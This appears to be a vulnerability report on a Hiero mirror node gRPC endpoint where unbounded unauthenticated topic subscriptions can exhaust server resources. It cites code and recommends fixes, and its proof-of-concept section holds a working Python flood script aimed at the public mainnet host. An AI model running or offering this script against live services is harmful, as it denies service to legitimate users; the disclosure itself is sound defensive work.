### Title
Unbounded Concurrent gRPC Subscriptions Allow Resource Exhaustion via Unauthenticated `subscribeTopic()` Calls

### Summary
`TopicMessageServiceImpl.subscribeTopic()` increments `subscriberCount` as a Micrometer gauge only — it is never checked against any maximum before accepting a new subscription. Combined with no per-IP TCP connection limit and no global subscription cap, an unauthenticated attacker can open arbitrarily many connections (each carrying up to 5 concurrent streams per `maxConcurrentCallsPerConnection`) with no `endTime`, holding them open indefinitely and exhausting file descriptors, memory, database connection pool slots, and the bounded elastic scheduler.

### Finding Description

**Exact code path:**

`subscribeTopic()` in `TopicMessageServiceImpl.java` lines 59–92:

```java
private final AtomicLong subscriberCount = new AtomicLong(0L);
// ...
return topicExists(filter)
    .thenMany(flux.doOnNext(topicContext::onNext)
        .doOnSubscribe(s -> subscriberCount.incrementAndGet())   // metric only
        .doFinally(s -> subscriberCount.decrementAndGet())
        .doFinally(topicContext::finished));
``` [1](#0-0) 

`subscriberCount` is wired exclusively to a Micrometer `Gauge` for observability:

```java
Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
     .register(meterRegistry);
``` [2](#0-1) 

There is no `if (subscriberCount.get() >= MAX) return error;` guard anywhere in the method.

**No-endTime subscriptions never self-terminate.** When `filter.getEndTime() == null`, `pastEndTime()` returns `Flux.never()`:

```java
private Flux<Object> pastEndTime(TopicContext topicContext) {
    if (topicContext.getFilter().getEndTime() == null) {
        return Flux.never();   // stream lives forever
    }
    ...
}
``` [3](#0-2) 

**Safety-check schedules a task on `boundedElastic()` per subscription:**

```java
Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
    .filter(_ -> !topicContext.isComplete())
    .flatMapMany(_ -> missingMessages(topicContext, null))
    .subscribeOn(Schedulers.boundedElastic());
``` [4](#0-3) 

With thousands of simultaneous subscriptions all firing their 1-second delay at once, this creates a burst of tasks on the bounded elastic scheduler (capped at `10 × CPU cores` threads with a 100 000-task queue).

**The only server-side limit is per-connection, not global.** `GrpcConfiguration` sets:

```java
serverBuilder.maxConcurrentCallsPerConnection(
    nettyProperties.getMaxConcurrentCallsPerConnection()); // default = 5
``` [5](#0-4) 

`NettyProperties` defaults to 5 calls per connection: [6](#0-5) 

There is no limit on the **number of TCP connections** from a single IP, no per-IP rate limit, and no authentication requirement on the `ConsensusController.subscribeTopic()` endpoint: [7](#0-6) 

**Root cause:** The failed assumption is that `subscriberCount` enforces a cap. It does not — it is a read-only metric. The per-connection call limit is bypassed by simply opening more connections.

### Impact Explanation

Each open subscription consumes:
- One HTTP/2 stream (file descriptor)
- One `TopicContext` object in heap
- One active listener subscription (Redis or DB polling)
- One bounded-elastic task slot at the 1-second mark

With N connections × 5 calls each:
- **File descriptor exhaustion** → new connections refused for all clients
- **HikariCP pool exhaustion** → DB queries for legitimate clients time out (alert threshold is 75% pool usage per existing Grafana rules)
- **Heap pressure / OOM** → JVM crash or GC stalls
- **Bounded elastic saturation** → safety-check DB queries queue behind attacker tasks, delaying message delivery for legitimate subscribers

This effectively denies service to all other gRPC clients without requiring any privileged access.

### Likelihood Explanation

- No authentication is required; any internet-reachable deployment is exposed.
- HTTP/2 connection establishment is cheap; opening thousands of connections from a single host or a small botnet is trivial.
- The attack is repeatable and persistent: subscriptions stay open until the server is restarted or the attacker disconnects.
- The `maxConcurrentCallsPerConnection = 5` default is documented publicly in `docs/configuration.md`, so an attacker knows exactly how many connections are needed per subscription slot. [8](#0-7) 

### Recommendation

1. **Enforce a global subscription cap** inside `subscribeTopic()`:
   ```java
   if (subscriberCount.get() >= grpcProperties.getMaxSubscribers()) {
       return Flux.error(new StatusRuntimeException(Status.RESOURCE_EXHAUSTED));
   }
   ```
2. **Add a per-IP connection limit** in `GrpcConfiguration` via `NettyServerBuilder.maxConnectionsPerIp()` (available in grpc-netty ≥ 1.57).
3. **Require `endTime` or a maximum subscription duration** so streams cannot be held open indefinitely.
4. **Add a total-connection limit** via `NettyServerBuilder.maxConnections()`.
5. **Apply token-bucket rate limiting** at the gRPC interceptor layer (analogous to the `ThrottleConfiguration` already used in the web3 module).

### Proof of Concept

```python
import grpc, threading
from hedera.mirror.api.proto import consensus_service_pb2_grpc
from hedera.mirror.api.proto import consensus_service_pb2
from hederahashgraph.api.proto.java import basic_types_pb2

TARGET = "grpc.mainnet.mirrornode.hedera.com:443"
TOPIC  = basic_types_pb2.TopicID(shardNum=0, realmNum=0, topicNum=1234)
CALLS_PER_CONN = 5   # matches maxConcurrentCallsPerConnection default

def flood(conn_id):
    channel = grpc.secure_channel(TARGET, grpc.ssl_channel_credentials())
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=TOPIC,
        # no consensusEndTime → subscription never terminates
    )
    threads = []
    for _ in range(CALLS_PER_CONN):
        t = threading.Thread(
            target=lambda: list(stub.subscribeTopic(query)),
            daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

# Open 2000 connections → 10 000 concurrent subscriptions
for i in range(2000):
    threading.Thread(target=flood, args=(i,), daemon=True).start()

input("Attack running. Press Enter to stop.")
```

Observe `hiero.mirror.grpc.subscribers` gauge climbing without bound, HikariCP active connections approaching pool maximum, and file descriptor count approaching OS limit — all from an unprivileged external client.

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-91)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);

    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
    }

    @Override
    public Flux<TopicMessage> subscribeTopic(TopicMessageFilter filter) {
        log.info("Subscribing to topic: {}", filter);
        TopicContext topicContext = new TopicContext(filter);

        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
        Flux<TopicMessage> live = Flux.defer(() -> incomingMessages(topicContext));

        // Safety Check - Polls missing messages after 1s if we are stuck with no data
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());

        Flux<TopicMessage> flux = historical
                .concatWith(Flux.merge(safetyCheck, live).takeUntilOther(pastEndTime(topicContext)))
                .filter(t -> {
                    TopicMessage last = topicContext.getLast();
                    return last == null || t.getSequenceNumber() > last.getSequenceNumber();
                });

        if (filter.getEndTime() != null) {
            flux = flux.takeWhile(t -> t.getConsensusTimestamp() < filter.getEndTime());
        }

        if (filter.hasLimit()) {
            flux = flux.take(filter.getLimit());
        }

        return topicExists(filter)
                .thenMany(flux.doOnNext(topicContext::onNext)
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
                        .doFinally(topicContext::finished));
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L123-131)
```java
    private Flux<Object> pastEndTime(TopicContext topicContext) {
        if (topicContext.getFilter().getEndTime() == null) {
            return Flux.never();
        }

        return Flux.empty()
                .repeatWhen(RepeatSpec.create(r -> !topicContext.isComplete(), Long.MAX_VALUE)
                        .withFixedDelay(grpcProperties.getEndTimeInterval()));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L28-35)
```java
    ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
            GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
        final var nettyProperties = grpcProperties.getNetty();
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java (L43-53)
```java
    public void subscribeTopic(ConsensusTopicQuery request, StreamObserver<ConsensusTopicResponse> responseObserver) {
        final var disposable = Mono.fromCallable(() -> toFilter(request))
                .flatMapMany(topicMessageService::subscribeTopic)
                .map(this::toResponse)
                .onErrorMap(ProtoUtil::toStatusRuntimeException)
                .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);

        if (responseObserver instanceof ServerCallStreamObserver serverCallStreamObserver) {
            serverCallStreamObserver.setOnCancelHandler(disposable::dispose);
        }
    }
```

**File:** docs/configuration.md (L424-424)
```markdown
| `hiero.mirror.grpc.netty.maxConcurrentCallsPerConnection`  | 5                | The maximum number of concurrent calls permitted for each incoming connection                             |
```
